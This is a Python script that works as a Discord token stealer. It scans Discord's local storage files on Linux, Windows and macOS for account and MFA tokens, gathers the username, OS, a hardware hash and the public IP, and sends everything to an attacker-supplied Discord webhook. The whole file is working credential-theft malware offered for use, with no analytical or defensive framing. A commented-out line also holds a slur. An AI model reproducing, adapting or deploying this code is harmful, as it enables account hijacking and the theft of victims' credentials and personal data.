import requests
import platform
import os
import getpass
import hashlib
import json, re


#put the webhook url inside the ""
#for example
#webhook = "https://discord.com/api/webhooks/857964923979563039/gjYn2-kRwjMt9WyHOni32ry4lYQCLNU6UFrbdTdAatSGGeuNUBlwXRW9ZTMXhBPhR78328"
webhook = ""


def hash(string):
    return hashlib.md5(bytes(string, "utf-8")).hexdigest()


def get_ip():
    for i in range(10):
        r = requests.get("http://checkip.amazonaws.com/")
        
        if r.status_code == 200:
            return r.text.strip("\n")


def get_tokens(OS):
    
    path = str(os.environ["HOME"])

    if "linux" in OS.lower():
        path += '/.config/discord/Local Storage/leveldb/'
    elif "windows" in OS.lower():
        path += "/AppData/Roaming/discord/Local Storage/leveldb/"
    elif "mac" in OS.lower():
        path += "/Library/Application Support/discord/Local Storage/leveldb/"
    
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
    except Exception as e:
        tokens.append(e)
    return tokens


def get_system_info():
    return [platform.system(), platform.release()], getpass.getuser()


def get_hwid():
    return hash(platform.system() + platform.release() + getpass.getuser())


def construct_message(system_info, hwid, tokens, ip):
    final = f"Username **{system_info[1]}** using **{system_info[0][0]}**, version **{system_info[0][1]}** has logged in from **{ip}**.\nHardware ID: **{hwid}**\nTokens:"
    for token in tokens:
        final += "\n**" + token + "**"

    final += "\n" + "*" + "="*50 + "*"
    
    return final

def log():
    system_info = get_system_info()
    hwid = get_hwid()
    tokens = get_tokens(system_info[0][0])
    ip = get_ip()

    message = construct_message(system_info, hwid, tokens, ip)

    #print("retard")

    data = {"content": message, "username": "For the linux homies", "avatar_url":"https://i.imgur.com/tJdY5yY.jpg"}

    for i in range(20):
        r = requests.post(webhook, data = data)

        if r.status_code == 204:
            break

if __name__ == "__main__":
    log()